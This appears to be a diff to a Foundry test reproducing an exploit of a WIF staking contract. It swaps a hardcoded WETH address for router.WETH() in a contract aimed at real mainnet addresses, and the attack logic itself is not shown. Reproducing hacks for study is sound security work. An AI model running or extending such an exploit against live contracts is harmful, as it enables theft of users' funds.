@@ -11,7 +11,6 @@ interface WIFStaking is IERC20 {
 contract WIFCOIN_ETHExploit is BaseTestWithBalanceLog {
     WIFStaking WifStake = WIFStaking(0xA1cE40702E15d0417a6c74D0bAB96772F36F4E99);
     IERC20 Wif = IERC20(0xBFae33128ecF041856378b57adf0449181FFFDE7);
-    IWETH weth = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
 
     Uni_Router_V2 router = Uni_Router_V2(payable(address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)));
     uint256 ethFlashAmt = 0.3 ether;
@@ -28,7 +27,7 @@ contract WIFCOIN_ETHExploit is BaseTestWithBalanceLog {
     function testExploit() public balanceLog {
         //Paths
         address[] memory buyPath = new address[](2);
-        buyPath[0] = address(weth); // weth
+        buyPath[0] = address(router.WETH()); // weth
         buyPath[1] = address(Wif); // token
         address[] memory sellPath = new address[](2);
         sellPath[0] = buyPath[1];
